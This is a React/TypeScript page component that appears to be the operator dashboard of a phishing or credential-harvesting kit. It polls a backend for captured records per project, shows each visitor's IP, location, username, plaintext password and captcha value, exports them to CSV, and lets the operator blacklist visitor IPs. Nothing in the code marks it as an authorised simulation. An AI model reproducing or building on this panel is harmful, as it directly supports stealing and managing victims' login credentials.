"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { useParams } from "react-router-dom";
import { ShieldBan } from "lucide-react";
import { api } from "@/api";
import { useI18n } from "@/i18n";
import { RECORDS_POLL_INTERVAL_MS } from "@/utils/projectDetailHelpers";
import { Button } from "@/components/ui/button";
import { RefreshButton } from "@/components/ui/refresh-button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { useProjectWorkspace } from "./ProjectDetailLayout";

type CredentialRow = {
  id: number;
  created_at?: string;
  ip_address?: string;
  ip_location?: string;
  username?: string;
  password?: string;
  captchavalue?: string;
  [key: string]: unknown;
};

type BlacklistEntry = {
  id: number;
  ip_address: string;
};

export default function ProjectRecords() {
  const { project } = useProjectWorkspace();
  const { id } = useParams();
  const { t } = useI18n();
  const [rows, setRows] = useState<CredentialRow[]>([]);
  const [loading, setLoading] = useState(false);
  const [keyword, setKeyword] = useState("");
  const [error, setError] = useState("");
  const [toast, setToast] = useState("");
  const [blacklistedIps, setBlacklistedIps] = useState<Set<string>>(new Set());
  const [pendingIp, setPendingIp] = useState<{
    ip: string;
    recordId: number;
  } | null>(null);
  const [blocking, setBlocking] = useState(false);

  const loadBlacklist = useCallback(async () => {
    try {
      const { data } = await api.getIPBlacklist();
      const entries = Array.isArray(data) ? (data as BlacklistEntry[]) : [];
      setBlacklistedIps(
        new Set(
          entries
            .map((e) => String(e.ip_address || "").trim())
            .filter(Boolean),
        ),
      );
    } catch {
      /* non-fatal for records view */
    }
  }, []);

  const load = useCallback(async () => {
    if (!id) return;
    setLoading(true);
    try {
      const { data } = await api.getCredentials(id);
      setRows(Array.isArray(data) ? data : []);
      setError("");
    } catch {
      setError(t("project.credentialsFetchFailed"));
    } finally {
      setLoading(false);
    }
  }, [id, t]);

  useEffect(() => {
    load();
    loadBlacklist();
    const timer = window.setInterval(load, RECORDS_POLL_INTERVAL_MS);
    return () => window.clearInterval(timer);
  }, [load, loadBlacklist]);

  useEffect(() => {
    if (!toast) return;
    const timer = window.setTimeout(() => setToast(""), 3000);
    return () => window.clearTimeout(timer);
  }, [toast]);

  const filtered = useMemo(() => {
    const q = keyword.trim().toLowerCase();
    if (!q) return rows;
    return rows.filter((row) =>
      Object.values(row).some((v) =>
        String(v ?? "")
          .toLowerCase()
          .includes(q),
      ),
    );
  }, [rows, keyword]);

  const format = (v?: string) => (v ? new Date(v).toLocaleString() : "-");

  const exportCsv = () => {
    if (!filtered.length) {
      setError(t("project.noCredentialsToExport"));
      return;
    }
    const escape = (v: unknown) => `"${String(v ?? "").replace(/"/g, '""')}"`;
    const content = [
      ["Time", "IP", "Location", "Username", "Password", "Captcha"],
      ...filtered.map((r) => [
        format(r.created_at),
        r.ip_address,
        r.ip_location,
        r.username,
        r.password,
        r.captchavalue,
      ]),
    ]
      .map((r) => r.map(escape).join(","))
      .join("\n");
    const url = URL.createObjectURL(
      new Blob(["\ufeff", content], { type: "text/csv;charset=utf-8" }),
    );
    const a = document.createElement("a");
    a.href = url;
    a.download = `${project.name || "project"}-records.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const requestBlacklist = (row: CredentialRow) => {
    const ip = String(row.ip_address || "").trim();
    if (!ip) {
      setError(t("project.noIpToBlacklist"));
      return;
    }
    setPendingIp({ ip, recordId: row.id });
  };

  const confirmBlacklist = async () => {
    if (!pendingIp) return;
    setBlocking(true);
    setError("");
    try {
      await api.createIPBlacklistEntry({
        ip_address: pendingIp.ip,
        credential_id: pendingIp.recordId,
        reason: t("project.addToBlacklistReason", { id: pendingIp.recordId }),
        enabled: true,
      });
      setBlacklistedIps((prev) => new Set(prev).add(pendingIp.ip));
      setToast(t("project.addToBlacklistSuccess"));
      setPendingIp(null);
    } catch (err) {
      const ax = err as { response?: { data?: { error?: string } } };
      setError(ax.response?.data?.error || t("project.addToBlacklistFailed"));
      setPendingIp(null);
    } finally {
      setBlocking(false);
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex flex-col gap-3 lg:flex-row lg:items-start lg:justify-between">
        <div>
          <h2 className="text-lg font-semibold">
            {t("project.workspaceRecords")}
          </h2>
          <p className="text-sm text-slate-500">
            {t("project.credentialsSubtitle")}
          </p>
        </div>
        <div className="flex flex-wrap gap-2">
          <Input
            className="w-64"
            value={keyword}
            onChange={(e) => setKeyword(e.target.value)}
            placeholder={t("project.searchRecords")}
          />
          <RefreshButton onClick={load} loading={loading} />
          <Button
            variant="outline"
            onClick={exportCsv}
            disabled={!filtered.length}
          >
            {t("project.exportCsv")}
          </Button>
        </div>
      </div>

      {error ? (
        <p className="rounded-md border border-red-200 bg-red-50 px-3 py-2 text-sm text-red-700">
          {error}
        </p>
      ) : null}
      {toast ? (
        <p className="rounded-md border border-emerald-200 bg-emerald-50 px-3 py-2 text-sm text-emerald-700">
          {toast}
        </p>
      ) : null}

      <Card>
        <CardContent className="overflow-x-auto p-0">
          <table className="w-full min-w-[920px] text-left text-sm">
            <thead className="border-b bg-slate-50 text-slate-600">
              <tr>
                <th className="px-4 py-3 font-medium">{t("project.tableTime")}</th>
                <th className="px-4 py-3 font-medium">IP</th>
                <th className="px-4 py-3 font-medium">
                  {t("project.tableLocation")}
                </th>
                <th className="px-4 py-3 font-medium">
                  {t("project.tableUsername")}
                </th>
                <th className="px-4 py-3 font-medium">
                  {t("project.tablePassword")}
                </th>
                <th className="px-4 py-3 font-medium">
                  {t("project.tableCaptcha")}
                </th>
                <th className="px-4 py-3 font-medium">{t("common.actions")}</th>
              </tr>
            </thead>
            <tbody>
              {loading && filtered.length === 0 ? (
                <tr>
                  <td colSpan={7} className="px-4 py-8 text-center text-slate-500">
                    …
                  </td>
                </tr>
              ) : filtered.length === 0 ? (
                <tr>
                  <td colSpan={7} className="px-4 py-8 text-center text-slate-500">
                    {t("project.credentialsEmpty")}
                  </td>
                </tr>
              ) : (
                [...filtered]
                  .sort(
                    (a, b) =>
                      new Date(b.created_at || 0).getTime() -
                      new Date(a.created_at || 0).getTime(),
                  )
                  .map((row) => {
                    const ip = String(row.ip_address || "").trim();
                    const already = ip ? blacklistedIps.has(ip) : false;
                    return (
                      <tr key={row.id} className="border-b last:border-0">
                        <td className="px-4 py-3 whitespace-nowrap">
                          {format(row.created_at)}
                        </td>
                        <td className="px-4 py-3 font-mono text-xs">
                          {ip || "-"}
                        </td>
                        <td className="px-4 py-3">{row.ip_location || "-"}</td>
                        <td className="px-4 py-3 font-mono text-xs">
                          {row.username || "-"}
                        </td>
                        <td className="px-4 py-3 font-mono text-xs">
                          {row.password || "-"}
                        </td>
                        <td className="px-4 py-3 font-mono text-xs">
                          {row.captchavalue || "-"}
                        </td>
                        <td className="px-4 py-3">
                          <Button
                            variant="outline"
                            size="sm"
                            disabled={!ip || already || blocking}
                            onClick={() => requestBlacklist(row)}
                            title={
                              already
                                ? t("project.alreadyBlacklisted")
                                : t("project.addToBlacklist")
                            }
                          >
                            <ShieldBan className="h-3.5 w-3.5" />
                            {already
                              ? t("project.alreadyBlacklisted")
                              : t("project.addToBlacklist")}
                          </Button>
                        </td>
                      </tr>
                    );
                  })
              )}
            </tbody>
          </table>
        </CardContent>
      </Card>

      <AlertDialog
        open={!!pendingIp}
        onOpenChange={(open) => {
          if (!open && !blocking) setPendingIp(null);
        }}
      >
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>{t("project.addToBlacklist")}</AlertDialogTitle>
            <AlertDialogDescription>
              {t("project.addToBlacklistConfirm", {
                ip: pendingIp?.ip || "",
              })}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel disabled={blocking}>
              {t("common.cancel")}
            </AlertDialogCancel>
            <AlertDialogAction
              className="bg-red-600 hover:bg-red-700"
              disabled={blocking}
              onClick={(e) => {
                e.preventDefault();
                confirmBlacklist();
              }}
            >
              {blocking ? "…" : t("common.confirm")}
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
}
